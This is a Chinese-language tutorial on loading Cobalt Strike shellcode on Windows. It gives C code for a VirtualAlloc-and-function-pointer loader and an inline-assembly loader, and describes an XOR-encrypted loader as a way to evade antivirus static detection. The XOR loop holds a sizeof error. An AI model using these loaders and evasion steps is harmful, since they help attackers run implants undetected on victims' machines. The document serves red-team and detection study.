## （一）shellcode概念

shellcode 本质上是一段与位置无关的代码，本质上是一段cpu指令。经常用于软件漏洞利用的载荷。例如，在cobalt strike(以下简称cs)中生成不论是分阶段的还是无阶段的raw文件,其实都是一段shellcode。

## （二）如何加载shellcode

加载shellcode的方式有很多，用C/C++  python golang c#等语言都可以加载，本质上是让cpu去执行shellcode,即eip/rip指向当前shellcode即可。以下以win32/C 环境开发为例。（IDE VS2019 社区版）

1、首先新建控制台项目并打开。

2、在cs中生成分阶段的shellcode，保存为原始格式的bin文件。这里我保存为aaa.bin

3、编写如下代码

```
#include <stdio.h>
#include <windows.h>
using namespace std;
int main()
{
    char shellcode\[\] \= "把shellcode粘贴到这里";
    LPVOID lpAlloc \= VirtualAlloc(0, sizeof shellcode, MEM\_COMMIT, PAGE\_EXECUTE\_READWRITE);
    memcpy(lpAlloc, shellcode, sizeof shellcode);
    ((void(\*)())lpAlloc)();
    return 0;
}
```

程序中，首先将cs的shellcode 赋值给数组shellcode

接着调用win32api中的函数，VirtualAlloc ，以下是msdn中的介绍

```
在调用进程的虚拟地址空间中保留、提交或更改页面区域的状态。此函数分配的内存会自动初始化为零。
LPVOID VirtualAlloc(
  \[in, optional\] LPVOID lpAddress,
  \[in\]           SIZE\_T dwSize,
  \[in\]           DWORD  flAllocationType,
  \[in\]           DWORD  flProtect
);
```

参数 lpAddress 表示 要分配的区域的起始地址

参数  dwSize 表示要分配的大小

参数 flAllocationType 表示分配内存的 类型 这里先给他MEM\_COMMIT类型

参数 flprotect 表示要申请的的内存的属性  我们这里要把shellcode 放进这块内存然后执行，所以填写PAGE\_EXECUTE\_READWRITE这个宏。

如果分配成功，系统会给我们一个指针。

之后调用memcp对内存继续拷贝。此时shellcode 就拷贝到了lpAlloc指向的内存。

最后我们要执行shellcode,这里用到了c语言函数的指针， ((void(\*)())将lpAlloc转化成一个函数指针类型。其本质就是将cpu的下一条指令指向shellcode。此时shellcode 就加载成功了。

如果在32位下，可以采用嵌入汇编的方式加载

```
#include <windows.h>
#include <stdio.h>
#pragma comment(linker, "/section:.data,RWE")
unsigned char shellcode\[\] \="cs的shellcode";
void main()
{
        \_\_asm
    {
        
        mov eax, offset shellcode
        jmp eax
    }
}
```

## 三、混淆

如果直接这样写代码，基本被杀，原因是cs的shellcode已经被各大杀毒软件厂商针对了。首先要过静态查杀.方法还是很多的.

例如 将原本的shellcode 进行异或加密.程序拿到加密的shellcode后进行解密.之后执行shellcode

以下是加密代码:

```
#include <windows.h>
#include <iostream>
int main(int argc, char \*\*argv) {
    char encShellcode\[\] \= "加密的shellcode";
    char key\[\] \= "abc123";
    char shellcode\[sizeof(encShellcode)\];   
    int j \= 0;
    for (int i \= 0; i < sizeof (encShellcode); i++) {
        if (j \== sizeof (key \- 1)) 
            j \= 0;
        shellcode\[i\] \= encShellcode\[i\] ^ key\[j\];
        j++;
}
    void \*exec \= VirtualAlloc(0, sizeof(shellcode), MEM\_COMMIT, PAGE\_EXECUTE\_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(\*)())exec)();
}
```

其中将shellcode 与 数组 key\[\] = "abc123"进行异或
